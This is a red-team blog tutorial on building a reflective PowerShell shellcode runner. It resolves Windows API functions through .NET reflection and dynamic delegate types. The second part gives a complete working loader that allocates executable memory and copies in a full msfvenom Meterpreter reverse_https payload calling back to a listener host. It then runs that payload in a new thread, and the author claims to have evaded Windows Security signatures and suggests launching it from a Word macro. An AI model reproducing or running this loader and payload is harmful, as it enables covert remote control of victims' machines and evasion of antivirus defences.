---
title: Reflective shellcode runner in PowerShell
date: 2025-06-24 +/-TTTT
categories: [REDTEAM]
tags: [powershell, shellcode, reflection, winapi]
---

## Part 1 - Understanding the mechanics

### LookupFunc: finding Windows API modules and functions

We'll examine how to call Windows API functions from PowerShell, starting with displaying a message box.

First, we need a way to locate functions in DLLs. We can use technique known as dynamic lookup. We will create the .NET assembly in memory.
To perform a dynamic lookup of function addresses the operating system provides two Win32 APIs called `GetModuleHandle` and `GetProcAddress`.

`GetModuleHandle` obtains a handle to the specified DLL, which is the memory address of the DLL. To find address of specific function we need to pass the DLL handle and the desired function to `GetProcAddress` which will return the function address.

We are relaying on `GetAssemblies` to search preloaded assemblies in the PowerShell process. We will loop through all assemblies and invoke `GetTypes` to obtain methods and structures. When C# code wants to directly invoke Win32 APIs it must provide the Unsafe keyword. Any functions to be be used must be declared as static to avoid instantiation. All these methods are ments to be used internally by the .NET code. This blocks us calling them directly from PowerShell or C#. To call them indirectly we need to obtain reference to these functions but firstly we must obtain a reference to the `System.dll` assembly using the `Get-Type` method. This will allow to subsequently locate the `GetModuleHandle` and `GetProcAddress` methods inside this dll.

**Using `GetType` to obtain a reference to the `System.dll` assembly at runtime is an example of the Reflection technique.**

We can use internal `Invoke` method to call `GetModuleHandle` and obtain the base address of an unmanaged DLL. The returned value is decimal and we transfer it into hexadecimal quivalent to obtain the actual memory address. The same applies to `GetProcAddress`.

The `LookupFunc` helper function does this by:

- Accessing .NET's internal methods through reflection
- Finding GetProcAddress (which locates function addresses)
- Returning the memory address of our desired function

Function below locates memory addresses of function in DLL. We'll use it to find `MessageBoxA` from `user32.dll`.

```powershell
function LookupFunc {
    Param (
        $moduleName,
        $functionName
    )

    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
        Where-Object {
            $_.GlobalAssemblyCache -And 
            $_.Location.Split('\\')[-1].Equals('System.dll')
        }
    ).GetType('Microsoft.Win32.UnsafeNativeMethods')

    $tmp = @()
    
    $assem.GetMethods() | ForEach-Object {
        If ($_.Name -eq "GetProcAddress") {
            $tmp += $_
        }
    }
    
    return $tmp[0].Invoke( # Using the first `GetProcAddress` function.
        $null, 
        @(
            ($assem.GetMethod('GetModuleHandle')).Invoke(
                $null, 
                @($moduleName)
            ), 
            $functionName
        )
    )
}
```

Formatted one, to use less lines of code:

```powershell
function LookupFunc {
	Param ($moduleName, $functionName)
	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object {$_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll')}).GetType('Microsoft.Win32.UnsafeNativeMethods')
	$tmp=@()
	$assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
	}
```

Later in our code, we will use it to save the result into a variable using format like so:

`$Variable = LookupFunc "nameof.dll" "WinAPIFunctionName"`

![MessageBoxAddress](https://i.imgur.com/ktAJtgs.png)


### DelegateType reflection - calling resolved functions

We create a DelegateType reflection to call the resolved function from unmanaged module address.

The information about the number of arguments and their associated data types must be paired with the resolved function memory address. In C# this is done using the `GetDelegateForFunctionPointer` method. It takes two arguments - memory address of the function (which we already know how to obtain) and function protorype represented as a type that we need to create.

In `C#` a function prototype is known as **Delegate** or **Delegate type**.

Key steps:

- `LookupFunc` finds `MessageBoxA` address in our example
- Creation of a new dynamic reflection assembly object
- Getting current AppDomain
- Defining dynamic assembly with executable permissions
- Creation of dynamic module object inside of assembly
- Custom type creation
- Defining constructor with MessageBoxA's signature
- Setting implementation flags
- Creating Invoke method
- Creating delegate type instance
- GetDelegateForFunctionPointer (Connecting our native function pointer to the managed delegate)
- Calling the function

This will result in a call to the function and message box will pop-up with our custom text.

```powershell
$MessageBoxA = LookupFunc "user32.dll" "MessageBoxA" # Saving resolved address to the variable

# 1. Create a dynamic assembly to host our delegate

$MyAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate') # Creating a new reflection assembly object with name 'ReflectedDelegate'

$Domain = [AppDomain]::CurrentDomain # Retrieves the current application domain (AppDomain) in which the PowerShell session is running

$MyAssemblyBuilder = $Domain.DefineDynamicAssembly($MyAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run) # Setting executable permissions on assembly. Specifies that the assembly can only be executed in memory and cannot be saved to disk

# 2. Create a module within the assembly

$MyModuleBuilder = $MyAssemblyBuilder.DefineDynamicModule('InMemoryModule', $false) # Creating Module inside of assembly. Setting custom module name. Second $false argument will exclude symbol information.

# Now we can create a custom type that will become our delegate type.

# 3. Define our custom delegate type

$MyTypeBuilder = $MyModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',[System.MulticastDelegate]) # The first argument is a custom name.
# Second is the list of attributes for the type. We set it to class so that later it can be instantiated. Public, non-executable and use ASCII instead of Unicode. Finally, it is set to be interpreted automatically since this undocumented setting is required.
# Third argument, we specify type it builds on top of. 'MulticastDelegate' will allow us to create a delegate type with multiple entries which will allow to call the target API with multiple arguments.

# Now we can put function prototype inside the newly created Type '$MyTypeBuilder' and let it become our custom delegate type.

# 4. Create constructor matching MessageBoxA signature

$MyConstructorBuilder = $MyTypeBuilder.DefineConstructor(

	'RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, @([IntPtr], [String], [String], [int])

)
# The first argument - atributes of the constructor itself. We make it Public and require it to be referenced by both name and signature by setting HideBySig, RTSpecialName and Public.
# The second arguemnt - calling convention for the constructor. This defines how arguments and return values are handles on the low level by .NET framework. (The default one is in use.
# The last argument - parameter types of the constructor that will become the function prototype. Basically, the arguments types of the function we would like to invoke.


#With the constructor created, we must call it. Before that, implementation flags must be set.  Runtime - used at runtime. Managed - the code is managed. =)

$MyConstructorBuilder.SetImplementationFlags('Runtime, Managed')

# Constructor is set up. No need to modify it or add anything else. But, in order to invoke it, we must tell .NET that delegate type to be used in calling a function. Let's define a separate thing, the Invoke method via 'DefineMethod' which takes settings of '$MyTypeBuilder'.

# DefineMethod takes 4 arguments.
# Name of the method. Method attributes. NewSlot and Virtual in second arg used to indicate that the method is virtual and ensure it always gets a new slot in the vtable.
# Third arg - return type of the function, which for example 'MessageBoxA' is int.
# Fourth - array of argument types for the function we would like to call.

# 5. Define the Invoke method (actual function call)

$MyMethodBuilder = $MyTypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', [int], @([IntPtr], [String], [String], [int]))

# Just as with constructor, we must set the implementation flags to allow the Invoke method to be called.

$MyMethodBuilder.SetImplementationFlags('Runtime, Managed')

# And finally, we create the delegate type object by instantiating $MyTypeBuilder.

# 6. Finalize the type

$MyDelegateType = $MyTypeBuilder.CreateType()


# We suply to $MyFunction the result of GetDelegateForFunctionPointer() function.

# 7. Connect our function pointer to the delegate

$MyFunction = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
	$MessageBoxA,
	$MyDelegateType
)

# 8. Call MessageBoxA

$MyFunction.Invoke([IntPtr]::Zero, "Hello World", "This is My MessageBox!", 0)
```

![MessageBoxCreated](https://i.imgur.com/8o5Fl6j.png)

If you read carefully, you might notice that we never call the defined constructor.

We don't explicitly call `MyConstructorBuilder` because it's used internally by .NET when we create the delegate with `GetDelegateForFunctionPointer` - the constructor defines the delegate's structure, and .NET automatically uses it when converting the function pointer to a managed delegate. The Invoke method is what we call directly, while the constructor works behind the scenes.

### Bonus - Invoking WinExec

Using the same technique, we can launch applications. we we will create a child process by spawning instance of `notepad.exe` process.

As previously, we declare and use `LookupFunc` to identify the memory addresses. This time, for `WinExec` from `KERNEL32.dll`.

To find the proper data types we can use resources below:

- [https://www.pinvoke.net/default.aspx/kernel32.winexec](https://www.pinvoke.net/default.aspx/kernel32.winexec)
- [https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-winexec](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-winexec)
- [https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow)

```powershell
function LookupFunc {

	Param ($moduleName, $functionName)

	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object {$_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll')}).GetType('Microsoft.Win32.UnsafeNativeMethods')
	$tmp=@()
	$assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
	
	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
	}

$WinExecFunc = LookupFunc "kernel32.dll" "WinExec" # Saving resolved address to the variable


$MyAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')

$Domain = [AppDomain]::CurrentDomain

$MyAssemblyBuilder = $Domain.DefineDynamicAssembly($MyAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)

$MyModuleBuilder = $MyAssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)

$MyTypeBuilder = $MyModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',[System.MulticastDelegate])

$MyConstructorBuilder = $MyTypeBuilder.DefineConstructor(

	'RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, @([String],[int]) # The third parameter - the arguments types of the WinExec function we would like to invoke.

)

$MyConstructorBuilder.SetImplementationFlags('Runtime, Managed')

$MyMethodBuilder = $MyTypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', [int], @([String],[int])) # Fourth argumtnt - array of argument types for the WinExec function.

$MyMethodBuilder.SetImplementationFlags('Runtime, Managed')

$MyDelegateType = $MyTypeBuilder.CreateType()

$MyFunction = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WinExecFunc, $MyDelegateType)

# Calling the WinExec function to create Notepad process.

$MyFunction.Invoke("notepad.exe", 5)
```

![Notepad](https://i.imgur.com/S4QfCWz.png)

Key Differences:
- We use WinExec instead of MessageBoxA
- The delegate type matches WinExec's simpler signature (just String and int parameters)
- The second parameter 5 makes the window visible (SW_SHOW)

---

## Part 2 - Loading shellcode

Since we need to call three different Win32 APIs (`VirtualAlloc`, `CreateThread` and `WaitForSingleObject`), we'll rewrite the portion of code that creates the delegate type into a function so that we can call it multiple times.
The resulting function is going to be `getDelegateType`. It should accept two arguments: **the function arguments** we would like to call gives as an array and it's **return type**.

```powershell
function getDelegateType {

    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type []] $func, # Array of function arguments
        [Parameter(Position = 1)] [Type] $delType = [Void] # Data type of return value
    )

    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, SnsiClass', [System.MulticastDelegate])

    $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')

    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')

    return $type.CreateType()

}
```

The complete code to load our Meterpreter shellcode is shown below:

```powershell
function LookupFunc {
	Param ($moduleName, $functionName)
	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object {$_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll')}).GetType('Microsoft.Win32.UnsafeNativeMethods')
	$tmp=@()
	$assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
	}

function getDelegateType {

    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type []] $func, # Array of function arguments
        [Parameter(Position = 1)] [Type] $delType = [Void] # Data type of return value
    )

    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])

    $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
    
    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
    
    
    return $type.CreateType()
}

# Creating delegates for `VirtualAlloc`, `CreateThread` and `WaitForSingleObject`.

# https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc - Microsoft Docs
# https://www.pinvoke.net/default.aspx/kernel32.virtualalloc - PInvoke
# https://bohops.com/2022/04/02/unmanaged-code-execution-with-net-dynamic-pinvoke/

$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)

# Meterpreter shellcode

# msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.8.9.9 LPORT=443 EXITFUNC=thread -f ps1

[Byte[]] $buf = 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x0,0x0,0x0,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x4d,0x31,0xc9,0x48,0xf,0xb7,0x4a,0x4a,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x2,0x2c,0x20,0x41,0xc1,0xc9,0xd,0x41,0x1,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x1,0xd0,0x66,0x81,0x78,0x18,0xb,0x2,0xf,0x85,0x72,0x0,0x0,0x0,0x8b,0x80,0x88,0x0,0x0,0x0,0x48,0x85,0xc0,0x74,0x67,0x48,0x1,0xd0,0x8b,0x48,0x18,0x50,0x44,0x8b,0x40,0x20,0x49,0x1,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x1,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0xd,0x41,0x1,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x3,0x4c,0x24,0x8,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x1,0xd0,0x66,0x41,0x8b,0xc,0x48,0x44,0x8b,0x40,0x1c,0x49,0x1,0xd0,0x41,0x8b,0x4,0x88,0x41,0x58,0x41,0x58,0x5e,0x59,0x48,0x1,0xd0,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x4b,0xff,0xff,0xff,0x5d,0x48,0x31,0xdb,0x53,0x49,0xbe,0x77,0x69,0x6e,0x69,0x6e,0x65,0x74,0x0,0x41,0x56,0x48,0x89,0xe1,0x49,0xc7,0xc2,0x4c,0x77,0x26,0x7,0xff,0xd5,0x53,0x53,0xe8,0x51,0x0,0x0,0x0,0x4d,0x6f,0x7a,0x69,0x6c,0x6c,0x61,0x2f,0x35,0x2e,0x30,0x20,0x28,0x57,0x69,0x6e,0x64,0x6f,0x77,0x73,0x20,0x4e,0x54,0x20,0x31,0x30,0x2e,0x30,0x3b,0x20,0x57,0x69,0x6e,0x36,0x34,0x3b,0x20,0x78,0x36,0x34,0x3b,0x20,0x72,0x76,0x3a,0x31,0x33,0x33,0x2e,0x30,0x29,0x20,0x47,0x65,0x63,0x6b,0x6f,0x2f,0x32,0x30,0x31,0x30,0x30,0x31,0x30,0x31,0x20,0x46,0x69,0x72,0x65,0x66,0x6f,0x78,0x2f,0x31,0x33,0x33,0x2e,0x30,0x0,0x59,0x53,0x5a,0x4d,0x31,0xc0,0x4d,0x31,0xc9,0x53,0x53,0x49,0xba,0x3a,0x56,0x79,0xa7,0x0,0x0,0x0,0x0,0xff,0xd5,0xe8,0x9,0x0,0x0,0x0,0x31,0x30,0x2e,0x38,0x2e,0x39,0x2e,0x39,0x0,0x5a,0x48,0x89,0xc1,0x49,0xc7,0xc0,0xbb,0x1,0x0,0x0,0x4d,0x31,0xc9,0x53,0x53,0x6a,0x3,0x53,0x49,0xba,0x57,0x89,0x9f,0xc6,0x0,0x0,0x0,0x0,0xff,0xd5,0xe8,0x90,0x0,0x0,0x0,0x2f,0x35,0x43,0x4d,0x59,0x56,0x31,0x30,0x42,0x35,0x43,0x39,0x41,0x71,0x45,0x47,0x71,0x4b,0x4d,0x42,0x38,0x38,0x51,0x38,0x41,0x70,0x52,0x72,0x52,0x63,0x4e,0x47,0x64,0x44,0x77,0x62,0x76,0x4e,0x70,0x6e,0x66,0x65,0x49,0x71,0x6a,0x73,0x31,0x46,0x4b,0x7a,0x6f,0x6c,0x78,0x46,0x49,0x6f,0x79,0x47,0x69,0x61,0x42,0x32,0x6c,0x6f,0x61,0x69,0x4b,0x67,0x52,0x6b,0x6e,0x6b,0x4f,0x32,0x32,0x38,0x4d,0x72,0x77,0x57,0x57,0x4e,0x53,0x4b,0x5f,0x46,0x53,0x2d,0x2d,0x73,0x57,0x6b,0x75,0x4d,0x37,0x4b,0x64,0x4a,0x5f,0x6d,0x4d,0x36,0x4a,0x30,0x6c,0x31,0x6a,0x4c,0x68,0x67,0x6b,0x67,0x4b,0x43,0x30,0x56,0x4b,0x51,0x46,0x54,0x43,0x51,0x51,0x53,0x4d,0x68,0x48,0x66,0x76,0x66,0x62,0x53,0x57,0x70,0x45,0x73,0x54,0x5a,0x42,0x67,0x54,0x6d,0x58,0x0,0x48,0x89,0xc1,0x53,0x5a,0x41,0x58,0x4d,0x31,0xc9,0x53,0x48,0xb8,0x0,0x32,0xa8,0x84,0x0,0x0,0x0,0x0,0x50,0x53,0x53,0x49,0xc7,0xc2,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x48,0x89,0xc6,0x6a,0xa,0x5f,0x48,0x89,0xf1,0x6a,0x1f,0x5a,0x52,0x68,0x80,0x33,0x0,0x0,0x49,0x89,0xe0,0x6a,0x4,0x41,0x59,0x49,0xba,0x75,0x46,0x9e,0x86,0x0,0x0,0x0,0x0,0xff,0xd5,0x4d,0x31,0xc0,0x53,0x5a,0x48,0x89,0xf1,0x4d,0x31,0xc9,0x4d,0x31,0xc9,0x53,0x53,0x49,0xc7,0xc2,0x2d,0x6,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x1f,0x48,0xc7,0xc1,0x88,0x13,0x0,0x0,0x49,0xba,0x44,0xf0,0x35,0xe0,0x0,0x0,0x0,0x0,0xff,0xd5,0x48,0xff,0xcf,0x74,0x2,0xeb,0xaa,0xe8,0x55,0x0,0x0,0x0,0x53,0x59,0x6a,0x40,0x5a,0x49,0x89,0xd1,0xc1,0xe2,0x10,0x49,0xc7,0xc0,0x0,0x10,0x0,0x0,0x49,0xba,0x58,0xa4,0x53,0xe5,0x0,0x0,0x0,0x0,0xff,0xd5,0x48,0x93,0x53,0x53,0x48,0x89,0xe7,0x48,0x89,0xf1,0x48,0x89,0xda,0x49,0xc7,0xc0,0x0,0x20,0x0,0x0,0x49,0x89,0xf9,0x49,0xba,0x12,0x96,0x89,0xe2,0x0,0x0,0x0,0x0,0xff,0xd5,0x48,0x83,0xc4,0x20,0x85,0xc0,0x74,0xb2,0x66,0x8b,0x7,0x48,0x1,0xc3,0x85,0xc0,0x75,0xd2,0x58,0xc3,0x58,0x6a,0x0,0x59,0xbb,0xe0,0x1d,0x2a,0xa,0x41,0x89,0xda,0xff,0xd5

# Copy shellcode to the created memory region

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)

# https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread - Microsoft Docs
# https://www.pinvoke.net/default.aspx/kernel32.createthread - PInvoke

$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0, $lpMem, [IntPtr]::Zero,0,[IntPtr]::Zero)

# During testing, after setting preparing $hThread variable, the Meterpreter session was spawned automatically if code executed directly in Windows PowerShell ISE. The code below might be needed if this PowerShell code was called let's say from macro of Microsoft Word process.

[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)

```

Through code obfuscation, I was able to evade the latest Windows Security signatures and achieve in-memory execution of Meterpreter shellcode as shown below:

![Bypass](https://i.imgur.com/9zzkyNi.png)

Thanks for reading — on to the next challenge.

---

## Support my work

<div align="center">
  <script type="text/javascript" 
          src="https://cdnjs.buymeacoffee.com/1.0.0/button.prod.min.js" 
          data-name="bmc-button" 
          data-slug="1nnxrmxst" 
          data-color="#808080" 
          data-emoji="☕" 
          data-font="Comic" 
          data-text="Buy me a coffee" 
          data-outline-color="#ffffff" 
          data-font-color="#ffffff" 
          data-coffee-color="#FFDD00">
  </script>
</div>